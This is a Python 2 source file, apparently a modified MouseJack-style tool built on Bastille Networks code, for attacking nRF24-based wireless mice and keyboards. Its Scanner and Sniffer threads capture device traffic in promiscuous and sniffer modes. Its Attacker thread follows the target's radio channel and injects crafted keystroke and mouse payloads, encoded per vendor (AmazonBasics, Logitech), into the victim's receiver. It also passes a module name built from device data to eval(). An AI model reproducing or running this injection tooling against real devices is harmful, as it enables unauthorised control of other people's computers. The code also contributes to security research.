#!/usr/bin/env python2
'''
  Copyright (C) 2016 Bastille Networks

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.

  Modified by xswxm
'''


import time, logging
from lib import common

import threading
from array import array

# common.init_args('./nrf24-scanner.py')
# common.parser.add_argument('-p', '--prefix', type=str, help='Promiscuous mode address prefix', default='')
# common.parser.add_argument('-d', '--dwell', type=float, help='Dwell time per channel, in milliseconds', default='100')

def ping(last_ping, channel_old, 
  timeout=0.1, 
  ping_payload='0F:0F:0F:0F'.replace(':', '').decode('hex'), 
  ack_timeout=max(0, min(0, 15)), 
  retries=max(0, min(1, 15))):
  success = True
  channel_new = None
  # Follow the target device if it changes channels
  if time.time() - last_ping > timeout:
    # First try pinging on the active channel
    if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):
      # Ping failed on the active channel, so sweep through all available channels
      success = False
      channels = range(2, 84)
      # channels = common.channels
      for channel in common.devices[common.deviceID].channels:
        channels.remove(channel)
        common.radio.set_channel(channel)
        if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
          # Ping successful, exit out of the ping sweep
          last_ping = time.time()
          success = True
          channel_new = channel
          break
      else:
        for channel in channels:
          common.radio.set_channel(channel)
          if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
            # Add new channel to channels
            common.devices[common.deviceID].channels.append(channel)
            # Ping successful, exit out of the ping sweep
            last_ping = time.time()
            success = True
            channel_new = channel
            break
    # Ping succeeded on the active channel
    else:
      last_ping = time.time()
  channel =  channel_new != None and channel_new or channel_old
  return last_ping, channel, success


class Scanner(threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.records = []
  def setup(self):
    # Parse the prefix addresses
    prefix = ''
    prefix_address = prefix.replace(':', '').decode('hex')
    # Put the radio in promiscuous mode
    common.radio.enter_promiscuous_mode(prefix_address)
  def run(self):
    self.setup()
    timeout = 0.1
    # Set the initial channel
    common.radio.set_channel(common.channels[0])
    # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    last_ping = time.time()
    channel_index = 0
    while not self._stopevent.isSet():
      # Increment the channel
      if len(common.channels) > 1 and time.time() - last_ping > timeout:
        channel_index = (channel_index + 1) % (len(common.channels))
        common.radio.set_channel(common.channels[channel_index])
        last_ping = time.time()
      # Received payload
      value = common.radio.receive_payload()
      # To improve the successful scanned result rate, 
      # we add the new scanned record to its record list
      # and check these values in another thread
      if len(value) >= 5:
        # Split the address and payload and append them into the records
        self.records.append([value[0:5], common.channels[channel_index], value[5:]])
      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
  def resume(self):
    if not self._flag.isSet():
      self.setup()
      self._flag.set()


class Sniffer(threading.Thread):
  def __init__(self, address=[0]*5):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.address = address
    self.records = []
  def setup(self):
    # Reset records
    self.records = []
    # Parse the address
    address = ''.join('{:02X}'.format(b) for b in self.address).decode('hex')[::-1][:5]
    # Put the radio in sniffer mode (ESB w/o auto ACKs)
    common.radio.enter_sniffer_mode(address)
  def run(self):
    self.setup()
    last_ping = time.time()
    channel = 0
    success = True
    while not self._stopevent.isSet():
      last_ping, channel, success= ping(last_ping, channel)
      # To improve the successful scanned result rate, 
      # we add the new scanned record to its record list
      # and check these values in another thread
      # Receive payloads
      if success:
        value = common.radio.receive_payload()
        if value[0] == 0:
          # Reset the channel timer
          last_ping = time.time()
          # Split the payload from the status byte and store the record
          self.records.append([channel, value[1:]])
      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
    self.moduler = None
    self.payloads = []
  def resume(self, address=None):
    if not self._flag.isSet():
      if address != None: self.address = address
      self.setup()
      self._flag.set()


class Attacker(threading.Thread):
  def __init__(self, address=None):
    threading.Thread.__init__(self)
    self._stopevent = threading.Event()
    self._flag = threading.Event()
    self._flag.set()
    self.address = address
    self.payloads = []
    self.records = []
  def setup(self):
    self.payloads = []
    self.records = []
    # Parse the prefix addresses
    address = ''.join('{:02X}'.format(b) for b in self.address).decode('hex')[::-1][:5]
    # Put the radio in promiscuous mode
    common.radio.enter_sniffer_mode(address)
  def run(self):
    self.setup()
    # Convert channel timeout from milliseconds to seconds
    timeout = 0.1
    # Parse the ping payload
    ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')
    # Format the ACK timeout and auto retry values
    ack_timeout = 0
    ack_timeout = max(0, min(ack_timeout, 15))
    retries = max(0, min(1, 15))
    # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    last_ping = time.time()
    channel = 0
    success = True
    while not self._stopevent.isSet():
      last_ping, channel, success= ping(last_ping, channel)
      # Send payload if ping is successful
      if success:
        while self.payloads != []:
          # Get a new payload
          payload = self.payloads[0]
          del self.payloads[0]
          # Get system payloads, such as sleep this thread for few seconds
          if len(payload) == 2:
            t = payload[0]+payload[1]*0x100
            self.records.append(['SYS', 'Sleep for {0} milliseconds'.format(t)])
            time.sleep(float(t)/1000)
            break
          # Get a new payload
          p = None
          p = ':'.join('{:02X}'.format(b) for b in payload)
          self.records.append([channel, p])
          # Send the payload
          p = p.replace(':', '').decode('hex')
          common.radio.transmit_payload(p)
          time.sleep(0.025)

      # self._stopevent.wait(interval)
      self._flag.wait()
  def join(self, timeout = None):
    while self.isAlive():
      self._flag.set()
      self._stopevent.set()
      threading.Thread.join(self, timeout)
  def pause(self):
    self._flag.clear()
  def resume(self, address):
    if not self._flag.isSet():
      if address != None: self.address = address
      self.setup()
      self._flag.set()
  def set_command(self, cmds):
    def split_command(cs):
      cmds = []
      i = 0
      while i < len(cs):
        if cs[i] == '<':
          new_cs = ''
          while i+1 < len(cs) and cs[i+1] != '>':
            i += 1
            new_cs += cs[i]
          cmds.append(new_cs)
          i += 1
        else:
          cmds.append(cs[i])
        i +=1
      return cmds
    try:
      device = common.devices[common.deviceID]
      from devices import amazonbasics, logitech_mouse
      encoder ='{0}.encode'.format(device.moduler)
      for cmd in split_command(cmds):
        # self.records.append(['CMD', cmd])
        for payload in eval(encoder)(cmd, device):
          self.payloads.append(payload)
    except Exception as e:
      self.records.append(['Err', str(e)])
      pass

    # device = common.devices[common.deviceID]
    # encoder ='{0}.encode'.format(device.moduler)
    # for cmd in split_command(cmds):
    #   for payload in eval(encoder)(cmd, device):
    #     self.payloads.append(payload)

    # self.payloads = []
    # file = open('payloads', 'r') 
    # # print file.read()
    # # print file.readlines()
    # for line in file:
    #   payload = array('B', [])
    #   for p in line.replace('\n', '').split(':'):
    #     payload.append(int(p, 16))
    #   self.payloads.append(payload)